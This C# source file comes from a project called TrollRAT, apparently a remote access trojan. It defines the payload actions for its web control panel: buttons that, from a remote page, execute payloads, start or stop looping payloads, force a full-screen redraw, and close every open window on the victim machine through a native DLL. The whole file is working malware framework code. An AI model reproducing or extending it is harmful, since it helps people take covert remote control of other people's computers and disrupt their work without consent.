using System;
using System.Runtime.InteropServices;

namespace TrollRAT
{
    public abstract class PayloadAction
    {
        private static int idCounter = 0;

        protected int id;
        public int ID => id;

        public PayloadAction()
        {
            id = idCounter++;
        }

        public abstract string getListButton(Payload payload);
        public abstract string getSettingsButton(Payload payload);

        // Returns JavaScript to be executed by the client
        public abstract string execute(Payload payload);

        // Returns the JavaScript that should be used for the button
        // in order to trigger its server routine
        public string getExecuteJavascript()
        {
            return String.Format("execute({0});", id);
        }
    }

    public abstract class SimplePayloadAction : PayloadAction
    {
        public override string getListButton(Payload payload)
        {
            string icon = getIcon(payload);

            if (icon == null)
                return null;

            return String.Format("<button type=\"button\" onclick=\"{0}\" class=\"btn btn-default btn-xs\">" +
                "<span class=\"glyphicon glyphicon-{1}\" aria-hidden=\"true\"></span></button> ",
                getExecuteJavascript(), icon);
        }

        public override string getSettingsButton(Payload payload)
        {
            return String.Format("<button type=\"button\" onclick=\"{0}\" class=\"btn btn-default btn-xl\">" +
               "{1}</button> ", getExecuteJavascript(), getTitle(payload));
        }

        public abstract string getTitle(Payload payload);
        public abstract string getIcon(Payload payload);
    }

    public class PayloadActionExecute : SimplePayloadAction
    {
        public override string execute(Payload payload)
        {
            payload.Execute();
            return "void(0);";
        }

        public override string getIcon(Payload payload) { return "cog"; }
        public override string getTitle(Payload payload) { return "Execute"; }
    }

    public class PayloadActionStartStop : SimplePayloadAction
    {
        public override string execute(Payload payload)
        {
            if (payload is LoopingPayload)
            {
                LoopingPayload pl = ((LoopingPayload)payload);
                if (pl.Running)
                {
                    pl.Stop();
                } else
                {
                    pl.Start();
                }
            } else
            {
                throw new ArgumentException("Payload is not a LoopingPayload");
            }

            return "update();";
        }

        public override string getIcon(Payload payload)
        {
            if (payload is LoopingPayload)
            {
                LoopingPayload pl = ((LoopingPayload)payload);
                return pl.Running ? "stop" : "play";
            }

            throw new ArgumentException("Payload is not a LoopingPayload");
        }

        public override string getTitle(Payload payload)
        {
            if (payload is LoopingPayload)
            {
                LoopingPayload pl = ((LoopingPayload)payload);
                return pl.Running ? "Stop" : "Start";
            }

            throw new ArgumentException("Payload is not a LoopingPayload");
        }
    }

    public class PayloadActionClearScreen : SimplePayloadAction
    {
        [DllImport("user32.dll")]
        static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, int flags);

        public override string execute(Payload payload)
        {
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133);
            return "void(0);";
        }

        public override string getIcon(Payload payload) { return null; }
        public override string getTitle(Payload payload) { return "Clear Screen"; }
    }

    public class PayloadActionClearWindows : SimplePayloadAction
    {
        [DllImport("TrollRATNative.dll")]
        static extern void clearWindows();

        public override string execute(Payload payload)
        {
            clearWindows();
            return "void(0);";
        }

        public override string getIcon(Payload payload) { return null; }
        public override string getTitle(Payload payload) { return "Close open Windows"; }
    }
}
